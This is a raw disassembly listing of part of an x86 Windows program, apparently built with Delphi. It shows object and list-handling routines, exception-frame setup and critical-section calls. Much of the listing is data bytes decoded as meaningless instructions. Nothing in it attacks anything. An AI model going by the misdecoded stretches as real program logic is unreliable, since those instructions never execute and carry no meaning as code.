add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
in al dx
scasb [ edi ]
inc ecx
add ah dl
test al 0x41
add [ eax ] bl
lodsd [ esi ]
inc ecx
add [ ebp * 4 - 0x5333ffbf ] ch
inc ecx
add ah bl
lodsb [ esi ]
inc ecx
add al bl
test eax 0xacec0041
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add ah dl
test al 0x41
add [ eax ] bl
lodsd [ esi ]
inc ecx
add [ ebp * 4 - 0x5333ffbf ] ch
inc ecx
add ah bl
lodsb [ esi ]
inc ecx
add al bl
test eax 0xacec0041
add ah ch
lodsb [ esi ]
insd
je r-xdata
popad
add [ ebp + 0x64040040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
jns r-xdata
push ebx
je r-xdata
insd
outsd
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add ah dl
test al 0x41
add [ eax ] ah
test eax 0xa9380041
inc ecx
add [ eax ] ch
scasd [ edi ]
inc ecx
add [ eax + 0x60004029 ] dl
scasd [ edi ]
inc ecx
add [ edx + ebp * 4 + 0x41 ] bl
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004164 ] dl
add [ eax ] al
add [ eax - 0x27ffbe9d ] bh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc ecx
test al 0x41
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add ah dl
aam 0xa8
inc ecx
je r-xdata
insd
popad
insd
fsub [ ebp + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc ecx
add [ eax + eax ] dl
add [ eax ] al
adc al 0x65
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
outsd
jb r-xdata
pop esp
stosb [ edi ]
inc ecx
je r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
pop eax
inc cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x41 ] dh
add [ eax ] bl
add [ eax ] al
add [ 0x33d80041 ] dl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec41a678
xor eax [ eax ]
loopne r-xdata
push ebx
push ebx
add [ eax + esi * 4 + 0x41 ] dl
add [ 0x6d654d54 ] cl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
test [ edi - 0x572bffbf ] ch
inc ecx
add [ eax ] ch
mov al 0x41
add [ eax ] bh
test eax 0xaf280041
inc ecx
add al ah
mov al 0x41
add [ eax - 0x51 ] ah
inc ecx
add [ edx + ebp * 4 + 0x41 ] bl
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
add [ eax ] ah
test eax 0xa9380041
inc ecx
add [ eax ] ch
scasd [ edi ]
inc ecx
add [ edx + esi * 4 - 0x509fffbf ] bl
inc ecx
add [ edx + ebp * 4 + 0x41 ] bl
add [ edi ] cl
push esp
push edx
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov dl 0x41
add ah dl
test al 0x41
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_416a17
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edi ] al
inc ebp
push esp
push 0x64616572
inc esp
push 0x41
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
add al 0xd4
jmp sub_420f24
outsb
jb r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
jmp sub_420f44
outsd
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp sub_420f24
je r-xdata
popad
insd
pop eax
push 0x41
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
inc esp
and al 0x4
aam 0xe9
imul esp [ eax + eax + 0x6a95cc00 ] 0x41
add [ ebx - 0x52ffbe96 ] ah
push 0x41
add [ ebp - 0x48ffbe96 ] cl
push 0x41
add ch al
push 0x41
add bh cl
push 0x41
add [ edx ] al
jns r-xdata
rcr al 0xe9
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e823e5
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
iretd
dec [ ebx - 0x3f7c3340 ]
fsubr st1
add bh bh
sub_416b38
imul [ edx + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x3400416b ] dh
insb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
imul eax [ ecx ] 0x24
insb
inc ecx
add [ eax ] dh
add [ eax ] al
add [ eax ] cl
pop esi
inc ecx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
or eax [ edx ]
in al 0xe
inc edx
add [ edi + eax + 0x42 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x6a ] al
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] dl
add ch bh
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al [ 0x68004207 ]
mov eax [ ecx ]
int3
sub_416bdf
push ecx
push eax
[ eax + 0xb ]
inc edx
add [ eax + 0xb ] ah
inc edx
add [ ebx + ecx + 0x42 ] ah
add [ ebx + ecx + 0x42 ] bh
add [ eax - 0x7fffbdf5 ] dh
or eax [ edx ]
mov [ ebx ] cl
inc edx
add [ ebx + ecx + 0xb980042 ] cl
inc edx
add [ esp + ecx + 0x42 ] al
add [ eax + 0xc ] bl
inc edx
add [ esi + ecx + 0x42 ] dh
add [ ebx + ecx + 0xb680042 ] al
inc edx
add [ ebx + ecx + 0x42 ] dl
add [ esi + ecx + 0x540a0042 ] bl
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x41 ] ch
outsb
outsb
je r-xdata
imul esp [ ebx + 0x41 ] 0x6f697463
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al 0xf
inc edx
add [ edi + ecx + 0xfe40042 ] ch
inc edx
add [ eax + edx + 0x42 ] al
add [ eax ] bl
adc [ edx ] al
dec eax
adc [ edx ] al
push 0xfc00420f
cmovb eax [ eax ]
push eax
adc [ edx ] al
adc [ edx + eax * 2 + 0x61 ] dl
add [ eax ] al
adc [ eax ] al
std
xor al 0x6c
inc ecx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
or eax [ edx ]
in al 0xe
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al [ 0x68004210 ]
mov eax [ ecx ]
int3
inc edx
add [ eax + edx + 0x42 ] bl
add al al
adc [ edx ] eax
adc [ fs : edx ] eax
clc
adc [ edx ] al
sub [ ecx ] dl
inc edx
add ah bh
adc [ edx ] al
dec eax
adc [ edx ] eax
add [ eax ] eax
out dx eax
[ ecx + edx ]
add [ eax ] al
adc [ edx ] eax
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ecx
outsb
outsb
je r-xdata
mov ah 0xb
inc edx
add [ esp + ecx + 0xedc0042 ] ch
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x6000408d
insd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
insd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4fffbe93 ] ch
insd
inc ecx
add [ eax + eax ] dl
add [ ebx + ebp * 2 ] dh
inc ecx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
outsd
add [ eax ] dl
add ch bh
imul eax [ ecx ] 0x7c
pop esi
inc ecx
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
xor eax [ eax ]
loopne r-xdata
add ah ah
xor eax [ eax ]
call 0xffffffffec41ad00
jae r-xdata
push 0x41
add [ eax ] cl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
loopne r-xdata
add [ eax + 0x6a ] al
inc ecx
jae r-xdata
inc edx
popad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_416e0c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405fa0
pop edi
pop esi
pop ebx
retn
sub_416e34
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405f84
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416e5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405fa8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416e9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x6e
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 ] bh
inc ecx
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al [ 0x9004170 ]
and al 0x33
in eax dx
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
enter 0x4173 0x0
or dl [ edx + edx * 2 + 0x65 ]
inc edi
jb r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
nop
jne r-xdata
xor ebp ebp
add al 0x89
add al 0x24
mov eax eax
cmp al 0x6f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418470
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4033bc
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4033bc
test al al
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_416f54
mov esi eax
jmp r-xdata
push esp
push edx
inc edi
jb r-xdata
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x9004170 ] ah
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416f54
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4033bc
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_416f54
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418470
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4033bc
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4033bc
test al al
je r-xdata
sub_416fb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_416f54
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416f54
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4033bc
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417024
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403160
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_418314
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4170a0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
mov eax [ esi + 0x4 ]
call sub_403190
mov eax [ esi + 0x8 ]
call sub_403190
mov eax [ esi + 0xc ]
call sub_403190
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4170e0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_418470
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4030f4
test al al
jne r-xdata
sub_417140
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_418470
mov edx eax
mov eax ebp
call sub_4033bc
test al al
jne r-xdata
sub_417184
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41721f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404184
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4170e0
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418314
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417226
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
sub_417244
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405144
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_417264
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418470
mov edx edi
call sub_417244
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418470
mov edx edi
call sub_417244
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418360
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_417244
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418360
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_417308
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_418470
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_417140
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_417354
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403160
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417024
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418314
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4173c8
push ebx
push esi
push edi
push ebp
call sub_40355c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403544
mov eax [ esi + 0x4 ]
mov edx edi
call sub_418470
call sub_403190
inc edi
dec ebp
jne r-xdata
sub_417424
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_418470
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_416fb4
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_417468
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4170e0
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_418470
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4174ac
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41752f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4030e0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417536
lea eax [ ebp - 0x10c ]
call sub_403f20
retn
sub_41753c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417424
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_416f48
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4174ac
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_418470
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418470
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4033bc
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417424
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418360
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_418314
sub_417628
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418470
mov edx ebp
call sub_41722c
test al al
jne r-xdata
sub_41766c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_417024
mov edx eax
mov eax [ edi + 0x4 ]
call sub_418314
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418470
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4184cc
test eax eax
jge r-xdata
sub_4176c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418470
mov esi eax
mov edx ebp
mov eax esi
call sub_417264
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403190
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418360
sub_417718
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403160
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
